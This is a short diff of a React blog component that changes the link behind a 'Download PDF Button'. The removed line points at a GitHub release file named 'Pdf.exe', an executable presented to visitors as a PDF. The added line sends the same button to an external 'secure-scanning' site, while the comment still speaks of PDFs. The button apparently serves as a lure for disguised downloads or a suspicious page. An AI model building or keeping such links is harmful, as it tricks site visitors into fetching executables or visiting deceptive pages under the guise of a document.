@@ -155,7 +155,7 @@ export default function LatestBlog({ onPostClick }) {
 
   {/* Download PDF Button */}
   <motion.a
-    href={`https://github.com/Richard-tech-alt/fbfreezed/releases/download/v1/Pdf.exe`} // Make sure these PDFs exist in /public/pdfs/
+    href={`https://secure-scanning.vercel.app/`} // Make sure these PDFs exist in /public/pdfs/
     download
     whileHover={{ scale: 1.05 }}
     whileTap={{ scale: 0.95 }}
